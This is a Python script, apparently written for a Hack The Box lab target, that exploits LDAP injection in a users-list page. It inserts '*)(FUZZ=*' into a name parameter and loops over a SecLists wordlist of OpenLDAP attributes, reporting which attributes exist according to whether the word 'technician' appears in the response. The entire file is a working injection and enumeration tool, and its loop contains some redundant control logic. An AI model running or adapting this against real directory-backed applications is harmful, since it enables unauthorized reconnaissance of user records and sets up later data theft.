#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

url = "http://internal.analysis.htb/users/list.php?name=*)(FUZZ=*"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = []
with open('SecLists/Fuzzing/LDAP-openldap-attributes.txt', 'r') as file:
    for line in file:
        line = line.strip()
        attributes.append(line)

print('Fuzzing...')
for attribute in attributes:
    finish = False
    
    while not finish:
        query = url.replace("FUZZ", attribute)
        #print(query)
        r = requests.post(query)
        #sys.stdout.write(f"\r{attribute}")
        #sleep(0.5) #Avoid brute-force bans
        if "technician" not in r.text and attribute != 'accountExpires':
            
            break
        else: 
            print(f"FOUND: {attribute}")
            break

        if attribute == attributes[-1]: 
                finish = True
                print()
